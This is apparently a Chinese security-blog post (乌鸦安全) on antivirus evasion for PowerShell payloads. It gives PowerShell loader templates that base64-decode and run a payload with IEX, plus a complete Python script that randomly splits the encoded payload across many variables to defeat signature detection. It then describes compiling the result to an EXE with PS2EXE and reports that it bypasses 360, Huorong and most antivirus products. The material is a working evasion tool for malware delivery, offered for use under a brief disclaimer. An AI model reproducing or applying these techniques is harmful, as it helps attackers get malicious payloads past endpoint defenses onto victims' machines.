> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA)

![](https://mmbiz.qpic.cn/mmbiz_png/xaUfm8URXuekQBS93GdYryjIs9TQd3nibGJKRMrXH0e4CQuBMfxA59GZxInpTtDqgHO3KOWqxlRicHP3vkyXYhTA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/xaUfm8URXuekQBS93GdYryjIs9TQd3nib3BuM4gjCmNOcVN2DtVOYshl9shmNLaoLVL8BuYsDoaTrIicJVOktnibA/640?wx_fmt=png)

点击上方蓝字关注我们

![](https://mmbiz.qpic.cn/mmbiz_png/al1OxRUwibUXtWs1ibqvwNlJ0FKeAOQLgg4Niaibib0k08p4Ww4VI9rBI8taicaDXXFEv7ibNMKJBvqAGW5JJkTTauNJQ/640?wx_fmt=png)

✎ 阅读须知

  

乌鸦安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。

乌鸦安全拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经授权，不得用于其他。

本文作者获得《GO 语言区块链应用开发从入门到精通》图书一本。

本文作者：culin 师傅

![](https://mmbiz.qpic.cn/mmbiz_png/v2xdUItjMNib4HsBWcwjGcyN0r7lOW63yhDoDwDk6ibTaAPWZ9B7YaBrZ0J43F5vm3HLkibbGlBQASceJO1uRnKmw/640?wx_fmt=png)

01

 **前  言**

  

昨天在 freebuf 上看到了一篇文章, 讲的是使用 ps2exe 将 powershell.ps1 文件, 编译成为可执行的 EXE 文件. 原文链接如下:

```
https://www.freebuf.com/articles/system/290918.html
```

于是想到自己之前的使用 base64 对 powershell 进行免杀, 就想讲这两个结合起来玩一下.

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

02

**Powershell.ps1 免杀**

  

首先讲下如何对 powershell.ps1 进行免杀：

原先生成的 powershell.ps1 文件中的内容如下, 很容易被杀软检测到.

  
![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CuoH5ax2ucgayuw8TibiaBPD1nETorRYEUuGnIbRU1UNpvxSKZhw3hib0qb00wMYxUGqvJbB4Epbdhg/640?wx_fmt=png)

我们需要做的是将他们整体 Base64 编码, 而后进行加载, 免杀后的 powershell.ps1 格式应该如下

```
$payload='原先powershell.ps1中内容base64编码后的内容'
$testforwindow=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload)
If ([IntPtr]::size -eq 8) {
IEX $testforwindow
}
```

按照这种思路, 也是可以上线的, 但是免杀效果不理想：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CuoH5ax2ucgayuw8TibiaBPDqJcRd4SV0cnLqicb3R8LX3ZDtmMQiad821JwCb9Qs9TID8vLWbHoxg1Q/640?wx_fmt=png)

于是考虑将代码分离后再组合运行, 代码逻辑如下：

```
$payload1='原先编码的某一部分'
$payload2='原先编码的另一部分'
$testforwindow=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload1+$payload2)
If ([IntPtr]::size -eq 8) {
IEX $testforwindow
}
```

按照这种思路我们进行了尝试, 是可以上线的。但是有时候杀软记录了特征, 如果一直固定分离成两个或者三个可能会失效。

于是做出了这样一个想法, 随机生成 a-z,A-Z,0-9 中任意一个字符, 将整个编码后的 base64 字符串进行一个切片, 然后赋值给不同的变量, 最后组合上线。

按照这个思路, 编写了如下的 Python 代码：

```
#encoding:utf-8
import os
import sys
import re
import base64
import getopt
import random
def ShellMake():
    PATH=input("请输入Payload路径:")
    #读取文件
    with open (PATH,"r+") as payload:
        encode=payload.read()
    Before_encode=re.findall("function (.*)",encode,re.S)
    Tmp_encode="function "+Before_encode[0]
    Temp_encode=base64.b64encode(Tmp_encode.encode('utf-8'))
    After_encode=str(Temp_encode)
    After_encode=After_encode[2:-1]
    Split_Chr=random.randint(65,122)
    while Split_Chr >= 91 and Split_Chr<=96:
        Split_Chr=random.randint(65,122)
    Split_Chr=chr(Split_Chr)
    Final_encode=After_encode.split(Split_Chr)
    Len=len(Final_encode)
    Long_str=''
    for i in range(0,Len-1):
        Final_encode[i]=Final_encode[i]+Split_Chr
        Long_str=Long_str+"$Doit"+str(i)+"+"
    #写入新的ps1,此时已经免杀
    Long_str=Long_str[0:-1]+"+$Doit"+str(Len-1)
    Destion=input("请输入输出目标:")
    with open(Destion,"a+") as payload:
        payload.writelines("Set-StrictMode -Version 2 \n")
        for i in range(0,Len):
            payload.writelines("$Doit"+str(i)+"='"+Final_encode[i]+"'\n")
        payload.writelines("$testforwindow=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("+Long_str+")) \n")
        payload.writelines("If ([IntPtr]::size -eq 8) {"+'\n')
        payload.writelines("IEX $testforwindow"+'\n')
        payload.writelines("}")
ShellMake()
```

运行方式如下:

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CuoH5ax2ucgayuw8TibiaBPDPlIQwUSw6r7t3hySPIUFAQmWscSiau6pG4daesOHWqvzufWDNFOHVPQ/640?wx_fmt=png)

成功生成 testfor.ps1 文件, 生成的文件结果每次都是随机. 有时候生成的变量可能达到上百个。

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CuoH5ax2ucgayuw8TibiaBPD1dp5NPGUaTxZzme3MASbKmMnZr9mGjnfwkyCzGibzLgx8qDdRNv7BLw/640?wx_fmt=png)

经过 Virustotal 检测, 已经过了很多杀软了：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CuoH5ax2ucgayuw8TibiaBPDNjbH8gj68dVSlH0eDAuQb5DJ4DiayDOzxjwia4KWqx8cP2IlibHpMDlqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

03

**py2exe 生成 exe**

  

ps2exe 项目地址如下

```
https://github.com/MScholtes/PS2EXE.git
```

存在图形化操作界面, 我们直接使用即可, 成功生成 Flash.exe 文件

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CuoH5ax2ucgayuw8TibiaBPDgH9k4aYOJPTxBMZyibrmTCOgNoVf1fMeRrFxBk8DshzV3JamgU92npw/640?wx_fmt=png)

最终成功生成一个 EXE 文件, 经测试绕过了 360, 火绒等绝大多数杀软，并且可以正常加载。

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CuoH5ax2ucgayuw8TibiaBPDoSRHqQZph5FmiaW1uXiaQUyDpvlTwngHVseV7tdnxzsMPf3YhWkv7ylw/640?wx_fmt=png)

本文作者 culin 师傅，感谢 culin 的技术分享。

![](https://mmbiz.qpic.cn/mmbiz_png/7PuqRWWU6zPRMxSeBfjvKhbuTlWQcqk8L2ib8dROI0fFTknJfEctspUxmbxZwkvG9214pibCEmGWsuEDvDad20tA/640?wx_fmt=png)  

新书推荐

![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQGCeAxCpwiafHPCQ59GvHz6giandwhxYRRbpy9Fg4r24n3DUppDIuN9AdtiaAYaIEm15OGhIfuv6Mzkg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/TN05MmJLxMrNiboff6rhmPUYUNXdWTXZfiaHXPuUGqmPZtqhI6NtGicPMIu6ohOCReWY2C4YZY4AIchDMyal6KWQw/640?wx_fmt=gif)

    《GO 语言区块链应用开发从入门到精通》全面地介绍了 Go 语言区块链应用工程师所需要的基础知识和各种技术，主要分为基础篇、进阶篇和实战篇三部分。全书共 7 章，其中 1～2 章为基础篇，介绍 Go 语言环境安装、基础语法、函数编程、容器编程、面向对象编程、并发编程以及网络编程；3～5 章为进阶篇，第 3 章介绍区块链基本原理、发展历程、行业应用案例，第 4 章主要介绍智能合约，包括 solidity 基础语法，多个经典案例，以及 Go 语言如何调用智能合约，第 5 章主要介绍区块链原理的程序化实践，包括 Go 语言实现 Base58 编码、P2P 网络、PoW 共识、区块链组块以及 UTXO 账户模型实现；6～7 章为实战篇，介绍 2 个实战项目，第 6 章介绍如何实现 Go 语言版的区块链钱包项目，内容包括助记词生成、私钥存储、Coin 交易以及 Token 交易等内容，第 7 章介绍如何实现一个版权交易系统，内容包含如何去设计区块链应用系统、后端功能如何与区块链相结合，它既是一个区块链系统应用项目，也是一个 Go 语言 Web 服务器项目。《GO 语言区块链应用开发从入门到精通》适合想从事 GO 语言区块链开发的程序员及 GO 语言爱好者阅读。

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1DeaJ0ky5Stox4KybVqH6pic7ECTZBPBzccd5DCNUfsibegZ49VJt9VoZThd8mRDEicRxzzYy8EALz4w/640?wx_fmt=jpeg)

  

点击上方链接，更多优惠等你哦~

tips：加我 wx，拉你入群，一起学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJOca699BJK50FDxBNnhRZrS1hyXb2K4AkLTYfJwticmyHQxv3X6vZHfQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/CibE0jlnugbX5SLGI9312kOrkH7gXIN5NPic75bQ8WbAFMEqvZiaQ0WSk4W9eYUfJJRzlMgibjic8mIGicMvjialoDgmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJkslQQ2B5nDuKBlpbKHHtME5RBrJsYucDbPWpyglY02yicRq93PTWn7w/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

乌鸦安全

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Bt3mgRlo88wGCQuAJ2kv0pzM18jFmpv4CJEBMNAicGSSvDlWSN6DG5JJ0Q8EI6oEuaZS0QNyAojYw/640?wx_fmt=gif)